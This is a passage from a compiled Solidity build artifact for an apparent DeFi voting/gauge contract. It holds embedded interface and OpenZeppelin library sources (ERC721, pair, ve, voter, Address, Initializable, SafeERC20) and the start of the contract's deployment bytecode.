approved,\\n        uint256 indexed tokenId\\n    );\\n\\n    /**\\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\\n     */\\n    event ApprovalForAll(\\n        address indexed owner,\\n        address indexed operator,\\n        bool approved\\n    );\\n\\n    /**\\n     * @dev Returns the number of tokens in ``owner``'s account.\\n     */\\n    function balanceOf(address owner) external view returns (uint256 balance);\\n\\n    /**\\n     * @dev Returns the owner of the `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function ownerOf(uint256 tokenId) external view returns (address owner);\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Transfers `tokenId` token from `from` to `to`.\\n     *\\n     * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\\n     * The approval is cleared when the token is transferred.\\n     *\\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\\n     *\\n     * Requirements:\\n     *\\n     * - The caller must own the token or be an approved operator.\\n     * - `tokenId` must exist.\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address to, uint256 tokenId) external;\\n\\n    /**\\n     * @dev Returns the account approved for `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function getApproved(uint256 tokenId)\\n        external\\n        view\\n        returns (address operator);\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\\n     *\\n     * Requirements:\\n     *\\n     * - The `operator` cannot be the caller.\\n     *\\n     * Emits an {ApprovalForAll} event.\\n     */\\n    function setApprovalForAll(address operator, bool _approved) external;\\n\\n    /**\\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\\n     *\\n     * See {setApprovalForAll}\\n     */\\n    function isApprovedForAll(address owner, address operator)\\n        external\\n        view\\n        returns (bool);\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external;\\n}\\n\",\"keccak256\":\"0x6983264dae1151fd2451f1cb2e4cb9a369f6dd25577600d1733fe6e4da0dc35d\",\"license\":\"MIT\"},\"contracts/interface/IFactory.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\ninterface IFactory {\\n    function treasury() external view returns (address);\\n\\n    function isPair(address pair) external view returns (bool);\\n\\n    function getInitializable()\\n        external\\n        view\\n        returns (\\n            address,\\n            address,\\n            bool\\n        );\\n\\n    function isPaused() external view returns (bool);\\n\\n    function pairCodeHash() external pure returns (bytes32);\\n\\n    function getPair(\\n        address tokenA,\\n        address token,\\n        bool stable\\n    ) external view returns (address);\\n\\n    function createPair(\\n        address tokenA,\\n        address tokenB,\\n        bool stable\\n    ) external returns (address pair);\\n}\\n\",\"keccak256\":\"0x22270dbb92d05a3dae6d38084db2ce1db27dee00af111b6502c34efe7106508b\",\"license\":\"MIT\"},\"contracts/interface/IGauge.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\ninterface IGauge {\\n    function notifyRewardAmount(address token, uint amount) external;\\n\\n    function getReward(address account, address[] memory tokens) external;\\n\\n    function claimFees() external returns (uint claimed0, uint claimed1);\\n}\\n\",\"keccak256\":\"0x182048b6ade43597025a2cbfc86979dcaed29d83abfaa48815efda839c7d6d33\",\"license\":\"MIT\"},\"contracts/interface/IGaugeFactory.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\ninterface IGaugeFactory {\\n    function createGauge(\\n        address _pool,\\n        address _bribe,\\n        address _ve,\\n        address[] memory _allowedRewardTokens\\n    ) external returns (address);\\n\\n    function createGaugeSingle(\\n        address _pool,\\n        address _bribe,\\n        address _ve,\\n        address _voter,\\n        address[] memory _allowedRewardTokens\\n    ) external returns (address);\\n}\\n\",\"keccak256\":\"0xbd8b9b1868d559e68e5c28894a7ab46434cbcfbc712713bd6ff6315243af0871\",\"license\":\"MIT\"},\"contracts/interface/IMinter.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\ninterface IMinter {\\n    function updatePeriod() external returns (uint);\\n}\\n\",\"keccak256\":\"0x9a1754a722d904de8ebd0d66d74707c0b5b8ebd56268fd1e7b247ab621d7c58d\",\"license\":\"MIT\"},\"contracts/interface/IMultiRewardsPool.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\ninterface IMultiRewardsPool {\\n    function underlying() external view returns (address);\\n\\n    function derivedSupply() external view returns (uint);\\n\\n    function derivedBalances(address account) external view returns (uint);\\n\\n    function totalSupply() external view returns (uint);\\n\\n    function balanceOf(address account) external view returns (uint);\\n\\n    function rewardTokens(uint id) external view returns (address);\\n\\n    function isRewardToken(address token) external view returns (bool);\\n\\n    function rewardTokensLength() external view returns (uint);\\n\\n    function derivedBalance(address account) external view returns (uint);\\n\\n    function left(address token) external view returns (uint);\\n\\n    function earned(address token, address account)\\n        external\\n        view\\n        returns (uint);\\n\\n    function registerRewardToken(address token) external;\\n\\n    function removeRewardToken(address token) external;\\n}\\n\",\"keccak256\":\"0x2fff1488dc483fe0c9ccc3642c522c94868e96d9173304f8fe404d91ad3c4f21\",\"license\":\"MIT\"},\"contracts/interface/IPair.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\ninterface IPair {\\n    // Structure to capture time period obervations every 30 minutes, used for local oracles\\n    struct Observation {\\n        uint timestamp;\\n        uint reserve0Cumulative;\\n        uint reserve1Cumulative;\\n    }\\n\\n    function permit(\\n        address owner,\\n        address spender,\\n        uint value,\\n        uint deadline,\\n        uint8 v,\\n        bytes32 r,\\n        bytes32 s\\n    ) external;\\n\\n    function swap(\\n        uint amount0Out,\\n        uint amount1Out,\\n        address to,\\n        bytes calldata data\\n    ) external;\\n\\n    function burn(address to) external returns (uint amount0, uint amount1);\\n\\n    function mint(address to) external returns (uint liquidity);\\n\\n    function getReserves()\\n        external\\n        view\\n        returns (\\n            uint112 _reserve0,\\n            uint112 _reserve1,\\n            uint32 _blockTimestampLast\\n        );\\n\\n    function getAmountOut(uint, address) external view returns (uint);\\n\\n    function claimFees() external returns (uint, uint);\\n\\n    function tokens() external view returns (address, address);\\n\\n    function token0() external view returns (address);\\n\\n    function token1() external view returns (address);\\n\\n    function stable() external view returns (bool);\\n\\n    function metadata()\\n        external\\n        view\\n        returns (\\n            uint dec0,\\n            uint dec1,\\n            uint r0,\\n            uint r1,\\n            bool st,\\n            address t0,\\n            address t1\\n        );\\n}\\n\",\"keccak256\":\"0x978d3132f8f5f6752533d94a3024f25ced205df57475d5e2d7c09f301dd7c762\",\"license\":\"MIT\"},\"contracts/interface/IVe.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\ninterface IVe {\\n    enum DepositType {\\n        DEPOSIT_FOR_TYPE,\\n        CREATE_LOCK_TYPE,\\n        INCREASE_LOCK_AMOUNT,\\n        INCREASE_UNLOCK_TIME,\\n        MERGE_TYPE\\n    }\\n\\n    struct Point {\\n        int128 bias;\\n        int128 slope; // # -dweight / dt\\n        uint ts;\\n        uint blk; // block\\n    }\\n    /* We cannot really do block numbers per se b/c slope is per time, not per block\\n     * and per block could be fairly bad b/c Ethereum changes blocktimes.\\n     * What we can do is to extrapolate ***At functions */\\n\\n    struct LockedBalance {\\n        int128 amount;\\n        uint end;\\n    }\\n\\n    function token() external view returns (address);\\n\\n    function balanceOfNFT(uint) external view returns (uint);\\n\\n    function isApprovedOrOwner(address, uint) external view returns (bool);\\n\\n    function createLockFor(\\n        uint,\\n        uint,\\n        address\\n    ) external returns (uint);\\n\\n    function userPointEpoch(uint tokenId) external view returns (uint);\\n\\n    function epoch() external view returns (uint);\\n\\n    function userPointHistory(uint tokenId, uint loc)\\n        external\\n        view\\n        returns (Point memory);\\n\\n    function pointHistory(uint loc) external view returns (Point memory);\\n\\n    function checkpoint() external;\\n\\n    function depositFor(uint tokenId, uint value) external;\\n\\n    function attachToken(uint tokenId) external;\\n\\n    function detachToken(uint tokenId) external;\\n\\n    function voting(uint tokenId) external;\\n\\n    function abstain(uint tokenId) external;\\n}\\n\",\"keccak256\":\"0x93a173b039792ac393165aab7a92882d0cc1d82257c4dfe13ee26631fe46e52a\",\"license\":\"MIT\"},\"contracts/interface/IVoter.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n\\npragma solidity ^0.8.13;\\n\\ninterface IVoter {\\n    function ve() external view returns (address);\\n\\n    function attachTokenToGauge(uint _tokenId, address account) external;\\n\\n    function detachTokenFromGauge(uint _tokenId, address account) external;\\n\\n    function emitDeposit(\\n        uint _tokenId,\\n        address account,\\n        uint amount\\n    ) external;\\n\\n    function emitWithdraw(\\n        uint _tokenId,\\n        address account,\\n        uint amount\\n    ) external;\\n\\n    function distribute(address _gauge) external;\\n\\n    function notifyRewardAmount(uint amount) external;\\n\\n    function init(address[] memory _tokens, address _minter) external;\\n}\\n\",\"keccak256\":\"0x1672c0bfb4f9aef51f1ddec6280330e9b3e6196ea527341a80080098921d2a1f\",\"license\":\"MIT\"},\"contracts/lib/Address.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)\\n\\npragma solidity ^0.8.13;\\n\\n/**\\n * @dev Collection of functions related to the address type\\n */\\nlibrary Address {\\n    /**\\n     * @dev Returns true if `account` is a contract.\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * It is unsafe to assume that an address for which this function returns\\n     * false is an externally-owned account (EOA) and not a contract.\\n     *\\n     * Among others, `isContract` will return false for the following\\n     * types of addresses:\\n     *\\n     *  - an externally-owned account\\n     *  - a contract in construction\\n     *  - an address where a contract will be created\\n     *  - an address where a contract lived, but was destroyed\\n     * ====\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\\n     *\\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\\n     * constructor.\\n     * ====\\n     */\\n    function isContract(address account) internal view returns (bool) {\\n        // This method relies on extcodesize/address.code.length, which returns 0\\n        // for contracts in construction, since the code is only stored at the end\\n        // of the constructor execution.\\n\\n        return account.code.length > 0;\\n    }\\n\\n    function functionCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        require(isContract(target), \\\"Address: call to non-contract\\\");\\n        (bool success, bytes memory returndata) = target.call(data);\\n        return verifyCallResult(success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the\\n     * revert reason using the provided one.\\n     *\\n     * _Available since v4.3._\\n     */\\n    function verifyCallResult(\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal pure returns (bytes memory) {\\n        if (success) {\\n            return returndata;\\n        } else {\\n            // Look for revert reason and bubble it up if present\\n            if (returndata.length > 0) {\\n                // The easiest way to bubble the revert reason is using memory via assembly\\n                assembly {\\n                    let returndata_size := mload(returndata)\\n                    revert(add(32, returndata), returndata_size)\\n                }\\n            } else {\\n                revert(errorMessage);\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(address target, bytes memory data)\\n        internal\\n        returns (bytes memory)\\n    {\\n        return\\n            functionDelegateCall(\\n                target,\\n                data,\\n                \\\"Address: low-level delegate call failed\\\"\\n            );\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        require(isContract(target), \\\"Address: delegate call to non-contract\\\");\\n\\n        (bool success, bytes memory returndata) = target.delegatecall(data);\\n        return verifyCallResult(success, returndata, errorMessage);\\n    }\\n}\\n\",\"keccak256\":\"0x284fcdaef2f20ec54759bfb0821ee3a3459a1f0bc302b29e7fcc3c2f42e728df\",\"license\":\"MIT\"},\"contracts/lib/Initializable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.5.0) (proxy/utils/Initializable.sol)\\n\\npragma solidity ^0.8.13;\\n\\nimport \\\"./Address.sol\\\";\\n\\n/**\\n * @dev This is a base contract to aid in writing upgradeable contracts, or any kind of contract that will be deployed\\n * behind a proxy. Since proxied contracts do not make use of a constructor, it's common to move constructor logic to an\\n * external initializer function, usually called `initialize`. It then becomes necessary to protect this initializer\\n * function so it can only be called once. The {initializer} modifier provided by this contract will have this effect.\\n *\\n * TIP: To avoid leaving the proxy in an uninitialized state, the initializer function should be called as early as\\n * possible by providing the encoded function call as the `_data` argument to {ERC1967Proxy-constructor}.\\n *\\n * CAUTION: When used with inheritance, manual care must be taken to not invoke a parent initializer twice, or to ensure\\n * that all initializers are idempotent. This is not verified automatically as constructors are by Solidity.\\n *\\n * [CAUTION]\\n * ====\\n * Avoid leaving a contract uninitialized.\\n *\\n * An uninitialized contract can be taken over by an attacker. This applies to both a proxy and its implementation\\n * contract, which may impact the proxy. To initialize the implementation contract, you can either invoke the\\n * initializer manually, or you can include a constructor to automatically mark it as initialized when it is deployed:\\n *\\n * [.hljs-theme-light.nopadding]\\n * ```\\n * /// @custom:oz-upgrades-unsafe-allow constructor\\n * constructor() initializer {}\\n * ```\\n * ====\\n */\\nabstract contract Initializable {\\n    /**\\n     * @dev Indicates that the contract has been initialized.\\n     */\\n    bool private _initialized;\\n\\n    /**\\n     * @dev Indicates that the contract is in the process of being initialized.\\n     */\\n    bool private _initializing;\\n\\n    /**\\n     * @dev Modifier to protect an initializer function from being invoked twice.\\n     */\\n    modifier initializer() {\\n        // If the contract is initializing we ignore whether _initialized is set in order to support multiple\\n        // inheritance patterns, but we only do this in the context of a constructor, because in other contexts the\\n        // contract may have been reentered.\\n        require(_initializing ? _isConstructor() : !_initialized, \\\"Initializable: contract is already initialized\\\");\\n\\n        bool isTopLevelCall = !_initializing;\\n        if (isTopLevelCall) {\\n            _initializing = true;\\n            _initialized = true;\\n        }\\n\\n        _;\\n\\n        if (isTopLevelCall) {\\n            _initializing = false;\\n        }\\n    }\\n\\n    /**\\n     * @dev Modifier to protect an initialization function so that it can only be invoked by functions with the\\n     * {initializer} modifier, directly or indirectly.\\n     */\\n    modifier onlyInitializing() {\\n        require(_initializing, \\\"Initializable: contract is not initializing\\\");\\n        _;\\n    }\\n\\n    function _isConstructor() private view returns (bool) {\\n        return !Address.isContract(address(this));\\n    }\\n}\\n\",\"keccak256\":\"0x38183be1332f4c833a8279b7d913f523431e50aa59f4f513020b82628c7d6c0e\",\"license\":\"MIT\"},\"contracts/lib/SafeERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/utils/SafeERC20.sol)\\n\\npragma solidity ^0.8.13;\\n\\nimport \\\"../interface/IERC20.sol\\\";\\nimport \\\"./Address.sol\\\";\\n\\n/**\\n * @title SafeERC20\\n * @dev Wrappers around ERC20 operations that throw on failure (when the token\\n * contract returns false). Tokens that return no value (and instead revert or\\n * throw on failure) are also supported, non-reverting calls are assumed to be\\n * successful.\\n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract,\\n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc.\\n */\\nlibrary SafeERC20 {\\n    using Address for address;\\n\\n    function safeTransfer(\\n        IERC20 token,\\n        address to,\\n        uint value\\n    ) internal {\\n        _callOptionalReturn(\\n            token,\\n            abi.encodeWithSelector(token.transfer.selector, to, value)\\n        );\\n    }\\n\\n    function safeTransferFrom(\\n        IERC20 token,\\n        address from,\\n        address to,\\n        uint value\\n    ) internal {\\n        _callOptionalReturn(\\n            token,\\n            abi.encodeWithSelector(token.transferFrom.selector, from, to, value)\\n        );\\n    }\\n\\n    function safeIncreaseAllowance(\\n        IERC20 token,\\n        address spender,\\n        uint value\\n    ) internal {\\n        uint newAllowance = token.allowance(address(this), spender) + value;\\n        _callOptionalReturn(\\n            token,\\n            abi.encodeWithSelector(\\n                token.approve.selector,\\n                spender,\\n                newAllowance\\n            )\\n        );\\n    }\\n\\n    /**\\n     * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement\\n     * on the return value: the return value is optional (but if data is returned, it must not be false).\\n     * @param token The token targeted by the call.\\n     * @param data The call data (encoded using abi.encode or one of its variants).\\n     */\\n    function _callOptionalReturn(IERC20 token, bytes memory data) private {\\n        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since\\n        // we're implementing it ourselves. We use {Address.functionCall} to perform this call, which verifies that\\n        // the target address contains contract code and also asserts for success in the low-level call.\\n\\n        bytes memory returndata = address(token).functionCall(\\n            data,\\n            \\\"SafeERC20: low-level call failed\\\"\\n        );\\n        if (returndata.length > 0) {\\n            // Return data is optional\\n            require(\\n                abi.decode(returndata, (bool)),\\n                \\\"SafeERC20: ERC20 operation did not succeed\\\"\\n            );\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xd09403b2f52a045a82861c53059fb835daabe908fd774f948370979588b3fe1a\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x6080604052600160005534801561001557600080fd5b50613c44806100256000396000f3fe608060405234801561001057600080fd5b50600436106102d65760003560e01c80637715ee7511610182578063ac4afa38116100e9578063ddbe883c116100a2578063ea94ee441161007c578063ea94ee44146106e7578063eb4a78e0146106fa578063fc0c546a1461070d578063fecdad601461072057600080fd5b8063ddbe883c146106a1578063de838fc1146106b4578063e380fcad146106c757600080fd5b8063ac4afa3814610601578063b9a09fd514610614578063c45a01551461063d578063c527ee1f14610650578063d23254b414610663578063d560b0d71461068e57600080fd5b8063a5f4301e1161013b578063a5f4301e1461055c578063a61c713a1461056f578063a7cac84614610582578063a86a366d146105a2578063a8c5d95a146105b5578063aa79979b146105de57600080fd5b80637715ee75146104e757806379e93824146104fa5780637e1ddf641461051a57806396c82e571461052d57806398fc55d8146105365780639b6a9d721461054957600080fd5b80633c6b16ab1161024157806353d78693116101fa578063666256aa116101d4578063666256aa146104a6578063698473e3146104b95780636a1b7ecc146104cc5780636ecbe38a146104d457600080fd5b806353d786931461047857806353f38e6b1461048057806363453ae11461049357600080fd5b80633c6b16ab1461040f5780633ccfd60b14610422578063402914f51461042a578063411b1f771461044a578063436596c41461045d5780634c6e62b61461046557600080fd5b806320b1cb6f1161029357806320b1cb6f146103885780632716ae661461039b5780632986c0e5146103ad578063310bd74b146103b657806332145f90146103c95780633af32abf146103dc57600080fd5b806306d6a1b2146102db57806307546172146103215780630d52333c146103345780631459457a146103475780631f8507161461035c5780632025e9b814610375575b600080fd5b6103046102e9366004613283565b600a602052600090815260409020546001600160a01b031681565b6040516001600160a01b0390911681526020015b60405180910390f35b600654610304906001600160a01b031681565b600454610304906001600160a01b031681565b61035a6103553660046132a0565b610733565b005b600154610304906201000090046001600160a01b031681565b61035a6103833660046133f0565b6108e1565b61035a6103963660046134ad565b610925565b6008545b604051908152602001610318565b61039f60125481565b61035a6103c4366004613511565b6109db565b61035a6103d7366004613511565b610ade565b6103ff6103ea366004613283565b60116020526000908152604090205460ff1681565b6040519015158152602001610318565b61035a61041d366004613511565b610c9b565b61035a610db9565b61039f610438366004613283565b60146020526000908152604090205481565b61035a61045836600461352a565b610e6d565b61035a610f4b565b61035a61047336600461355a565b610fb5565b61035a61116f565b61035a61048e36600461359b565b611180565b61035a6104a1366004613283565b6111b6565b61035a6104b43660046135bd565b6111c2565b61035a6104c736600461352a565b61130d565b61039f6113e2565b61035a6104e2366004613283565b6113f1565b61035a6104f53660046135bd565b6113fa565b61039f610508366004613511565b600f6020526000908152604090205481565b61035a61052836600461362a565b61153f565b61039f60075481565b61035a610544366004613671565b6115e7565b61035a61055736600461359b565b611749565b61030461056a366004613283565b6117af565b61035a61057d36600461369d565b611c9d565b61039f610590366004613283565b600c6020526000908152604090205481565b6103046105b036600461359b565b611d0f565b6103046105c3366004613283565b600b602052600090815260409020546001600160a01b031681565b6103ff6105ec366004613283565b60106020526000908152604090205460ff1681565b61030461060f366004613511565b611d47565b610304610622366004613283565b6009602052600090815260409020546001600160a01b031681565b600254610304906001600160a01b031681565b61035a61065e3660046133f0565b611d71565b61039f61067136600461352a565b600d60209081526000928352604080842090915290825290205481565b61035a61069c3660046133f0565b611e0e565b61035a6106af36600461355a565b611e4e565b61035a6106c2366004613710565b611fd5565b61039f6106d5366004613283565b60136020526000908152604090205481565b61035a6106f536600461369d565b6121e5565b600554610304906001600160a01b031681565b600354610304906001600160a01b031681565b61035a61072e366004613710565b612257565b600154610100900460ff1661074e5760015460ff1615610752565b303b155b6107ba5760405162461bcd60e51b815260206004820152602e60248201527f496e697469616c697a61626c653a20636f6e747261637420697320616c72656160448201526d191e481a5b9a5d1a585b1a5e995960921b60648201526084015b60405180910390fd5b600154610100900460ff161580156107dc576001805461ffff19166101011790555b6001805462010000600160b01b031916620100006001600160a01b0389811691820292909217909255600280546001600160a01b03191691881691909117905560408051637e062a3560e11b8152905163fc0c546a916004808201926020929091908290030181865afa158015610857573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061087b919061378a565b600380546001600160a01b03199081166001600160a01b039384161790915560048054821687841617905560058054821686841617905560068054909116918416919091179055600160005580156108d9576001805461ff00191690555b505050505050565b60005b81518110156109215761090f828281518110610902576109026137a7565b6020026020010151612420565b80610919816137d3565b9150506108e4565b5050565b60005b82518110156109d657828181518110610943576109436137a7565b60200260200101516001600160a01b03166331279d3d3384848151811061096c5761096c6137a7565b60200260200101516040518363ffffffff1660e01b8152600401610991929190613830565b600060405180830381600087803b1580156109ab57600080fd5b505af11580156109bf573d6000803e3d6000fd5b5050505080806109ce906137d3565b915050610928565b505050565b60015460405163430c208160e01b815233600482015260248101839052620100009091046001600160a01b03169063430c208190604401602060405180830381865afa158015610a2f573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a539190613854565b610a6f5760405162461bcd60e51b81526004016107b190613876565b610a788161264c565b60015460405163c1f0fb9f60e01b815260048101839052620100009091046001600160a01b03169063c1f0fb9f90602401600060405180830381600087803b158015610ac357600080fd5b505af1158015610ad7573d6000803e3d6000fd5b5050505050565b6000818152600e6020908152604080832080548251818502810185019093528083529192909190830182828015610b3e57602002820191906000526020600020905b81546001600160a01b03168152600190910190602001808311610b20575b5050505050905060008151905060008167ffffffffffffffff811115610b6657610b66613311565b604051908082528060200260200182016040528015610b8f578160200160208202803683370190505b5090506000805b83811015610c8e57600d60008781526020019081526020016000206000868381518110610bc557610bc56137a7565b60200260200101516001600160a01b03166001600160a01b0316815260200190815260200160002054838281518110610c0057610c006137a7565b6020026020010181815250506000838281518110610c2057610c206137a7565b602002602001015113610c5557828181518110610c3f57610c3f6137a7565b6020026020010151610c5090613896565b610c70565b828181518110610c6757610c676137a7565b60200260200101515b610c7a90836138b2565b915080610c86816137d3565b915050610b96565b50610ad78585848461285c565b80600003610cd95760405162461bcd60e51b815260206004820152600b60248201526a1e995c9bc8185b5bdd5b9d60aa1b60448201526064016107b1565b6007546000819003610d185760405162461bcd60e51b8152602060048201526008602482015267217765696768747360c01b60448201526064016107b1565b600354610d30906001600160a01b0316333085612c32565b600081610d4584670de0b6b3a76400006138f3565b610d4f9190613928565b90508015610d6f578060126000828254610d69919061393c565b90915550505b6003546040518481526001600160a01b039091169033907ff70d5c697de7ea828df48e5c4573cb2194c659f1901f70110c52b066dcf50826906020015b60405180910390a3505050565b73175fb9401bb5e360ff3c0ef000971169441289303314610dd957600080fd5b60035460405163a9059cbb60e01b81527344ce1b841a0a939294e3ca3c7e8efc0e4fc07c3160048201526a0152d02c7e14af6800000060248201819052916001600160a01b03169063a9059cbb906044016020604051808303816000875af1158015610e49573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109219190613854565b3360009081526010602052604090205460ff16610e9c5760405162461bcd60e51b81526004016107b190613954565b8115610f0657600154604051634c3c15a760e11b815260048101849052620100009091046001600160a01b0316906398782b4e90602401600060405180830381600087803b158015610eed57600080fd5b505af1158015610f01573d6000803e3d6000fd5b505050505b60405182815233906001600160a01b038316907fae268d9aab12f3605f58efd74fd3801fa812b03fdb44317eb70f46dff0e19e22906020015b60405180910390a35050565b60085460005b8181101561092157610fa36009600060088481548110610f7357610f736137a7565b60009182526020808320909101546001600160a01b03908116845290830193909352604090910190205416612420565b80610fad816137d3565b915050610f51565b60008111610fd55760405162461bcd60e51b81526004016107b190613974565b6001546040516331a9108f60e11b815260048101839052620100009091046001600160a01b031690636352211e90602401602060405180830381865afa158015611023573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611047919061378a565b6001600160a01b0316336001600160a01b0316146110775760405162461bcd60e51b81526004016107b190613876565b61107f612c9d565b6001546040516339f890b560e21b815260048101849052620100009091046001600160a01b03169063e7e242d490602401602060405180830381865afa1580156110cd573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906110f19190613994565b1161110e5760405162461bcd60e51b81526004016107b1906139ad565b604051631c8db79360e31b81526001600160a01b03848116600483015283169063e46dbc98906024015b600060405180830381600087803b15801561115257600080fd5b505af1158015611166573d6000803e3d6000fd5b50505050505050565b60085461117e90600090611749565b565b815b818110156109d6576111a46009600060088481548110610f7357610f736137a7565b806111ae816137d3565b915050611182565b6111bf81612420565b50565b60015460405163430c208160e01b815233600482015260248101839052620100009091046001600160a01b03169063430c208190604401602060405180830381865afa158015611216573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061123a9190613854565b6112565760405162461bcd60e51b81526004016107b190613876565b60005b835181101561130757838181518110611274576112746137a7565b60200260200101516001600160a01b031663a7852afa8385848151811061129d5761129d6137a7565b60200260200101516040518363ffffffff1660e01b81526004016112c29291906139cd565b600060405180830381600087803b1580156112dc57600080fd5b505af11580156112f0573d6000803e3d6000fd5b5050505080806112ff906137d3565b915050611259565b50505050565b3360009081526010602052604090205460ff1661133c5760405162461bcd60e51b81526004016107b190613954565b81156113a5576001546040516246b3bd60e81b815260048101849052620100009091046001600160a01b0316906346b3bd0090602401600060405180830381600087803b15801561138c57600080fd5b505af11580156113a0573d6000803e3d6000fd5b505050505b60405182815233906001600160a01b038316907f60940192810a6fb3bce3fd3e2e3a13fd6ccc7605e963fb87ee971aba829989bd90602001610f3f565b60006113ec612c9d565b905090565b6111bf81612e1e565b60015460405163430c208160e01b815233600482015260248101839052620100009091046001600160a01b03169063430c208190604401602060405180830381865afa15801561144e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906114729190613854565b61148e5760405162461bcd60e51b81526004016107b190613876565b60005b8351811015611307578381815181106114ac576114ac6137a7565b60200260200101516001600160a01b031663a7852afa838584815181106114d5576114d56137a7565b60200260200101516040518363ffffffff1660e01b81526004016114fa9291906139cd565b600060405180830381600087803b15801561151457600080fd5b505af1158015611528573d6000803e3d6000fd5b505050508080611537906137d3565b915050611491565b6006546001600160a01b031633146115835760405162461bcd60e51b815260206004820152600760248201526610b6b4b73a32b960c91b60448201526064016107b1565b60005b82518110156115c3576115b18382815181106115a4576115a46137a7565b6020026020010151612f01565b806115bb816137d3565b915050611586565b50600680546001600160a01b0319166001600160a01b039290921691909117905550565b600081116116075760405162461bcd60e51b81526004016107b190613974565b6001546040516331a9108f60e11b815260048101839052620100009091046001600160a01b031690636352211e90602401602060405180830381865afa158015611655573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190611679919061378a565b6001600160a01b0316336001600160a01b0316146116a95760405162461bcd60e51b81526004016107b190613876565b6116b1612c9d565b6001546040516339f890b560e21b815260048101849052620100009091046001600160a01b03169063e7e242d490602401602060405180830381865afa1580156116ff573d6000803e3d6000fd5b505050506040513